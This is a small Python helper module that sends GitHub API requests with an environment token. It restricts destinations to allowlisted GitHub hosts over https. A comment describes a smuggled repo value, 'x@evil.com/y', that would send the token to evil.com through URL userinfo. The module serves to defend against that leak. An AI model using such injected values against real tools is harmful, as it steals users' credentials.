#!/usr/bin/env python3
"""Shared GitHub helpers for skill install scripts."""

from __future__ import annotations

import os
import urllib.parse
import urllib.request


# This function attaches GITHUB_TOKEN/GH_TOKEN to whatever URL it is given, so
# the URL decides where the credential goes. Callers build URLs by interpolating
# an owner/repo they were handed -- and everything before an `@` in a URL is
# userinfo, so a repo spelled `x@evil.com/y` makes
# `https://api.github.com/repos/x@evil.com/y/...` resolve to evil.com with the
# token attached. Pin the destination here, at the single point where the
# credential is added, rather than at each caller. `hostname` (not `netloc`) is
# what strips userinfo and yields the host actually dialled.
_ALLOWED_HOSTS = frozenset({"api.github.com", "codeload.github.com"})
_REQUEST_TIMEOUT = 30


def github_request(url: str, user_agent: str) -> bytes:
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme != "https" or parsed.hostname not in _ALLOWED_HOSTS:
        raise ValueError(
            f"Refusing to send credentials to {parsed.scheme}://{parsed.hostname}; "
            f"allowed: {', '.join(sorted(_ALLOWED_HOSTS))} over https"
        )
    headers = {"User-Agent": user_agent}
    token = os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN")
    if token:
        headers["Authorization"] = f"token {token}"
    req = urllib.request.Request(url, headers=headers)
    with urllib.request.urlopen(req, timeout=_REQUEST_TIMEOUT) as resp:
        return resp.read()


def github_api_contents_url(repo: str, path: str, ref: str) -> str:
    return f"https://api.github.com/repos/{repo}/contents/{path}?ref={ref}"
